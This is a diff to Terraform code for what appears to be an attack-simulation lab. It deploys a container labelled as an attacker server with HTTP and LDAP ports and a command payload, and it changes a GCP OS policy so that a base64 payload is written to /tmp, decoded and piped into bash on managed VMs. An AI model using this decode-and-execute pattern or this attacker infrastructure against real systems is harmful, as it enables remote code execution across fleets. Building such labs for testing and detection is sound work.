@@ -33,6 +33,30 @@ locals {
         sleep 120
     done
     log "docker path: $(which docker)"
+    server="${local.attacker_ip}"
+    timeout=600
+    start_time=$(date +%s)
+    # Check if $server is an IP address
+    if [[ $server =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+        log "server is set to IP address $server, no need to resolve DNS"
+    else
+        log "checking dns resolution: $server"
+        while true; do
+            ip=$(dig +short $server)
+            if [ -z "$ip" ]; then  # If $ip is empty, the domain hasn't resolved yet
+                current_time=$(date +%s)
+                elapsed_time=$((current_time - start_time))
+                if [ $elapsed_time -gt $timeout ]; then
+                    echo "DNS resolution for $server timed out after $timeout seconds"
+                    exit 1
+                fi
+                sleep 1
+            else
+                echo "$server resolved to $ip"
+                break
+            fi
+        done
+    fi
     if [[ `sudo docker ps | grep ${local.name}` ]]; then docker stop ${local.name}; fi
     log "$(echo 'docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:${local.attacker_http_port} -p ${local.attacker_ldap_port}:${local.attacker_ldap_port} ${local.image} ${local.command_payload}')"
     docker run -d --name ${local.name} --rm -p ${local.attacker_http_port}:${local.attacker_http_port} -p ${local.attacker_ldap_port}:${local.attacker_ldap_port} ${local.image} ${local.command_payload} >> $LOGFILE 2>&1
@@ -58,7 +82,7 @@ locals {
 #####################################################
 
 locals {
-    resource_name = "${replace(var.tag, "_", "-")}-${var.environment}-${var.deployment}-${random_string.this.id}"
+    resource_name = "${replace(substr(var.tag,0,35), "_", "-")}-${var.environment}-${var.deployment}-${random_string.this.id}"
 }
 
 
@@ -119,13 +143,13 @@ resource "google_os_config_os_policy_assignment" "this" {
         exec {
           validate {
             interpreter      = "SHELL"
-            output_file_path = "$HOME/os-policy-tf.out"
-            script           = "/bin/bash -c 'echo ${local.base64_payload} | tee /tmp/payload_${var.tag} | base64 -d | /bin/bash - &' && exit 100"
+            
+            script           = "if echo '${sha256(local.base64_payload)} /tmp/payload_${var.tag}' | sha256sum --check --status; then exit 100; else exit 101; fi"
           }
           enforce {
             interpreter      = "SHELL"
-            output_file_path = "$HOME/os-policy-tf.out"
-            script           = "exit 100"
+            
+            script           = "echo ${local.base64_payload} | tee /tmp/payload_${var.tag} | base64 -d | bash & exit 100"
           }
         }
       }
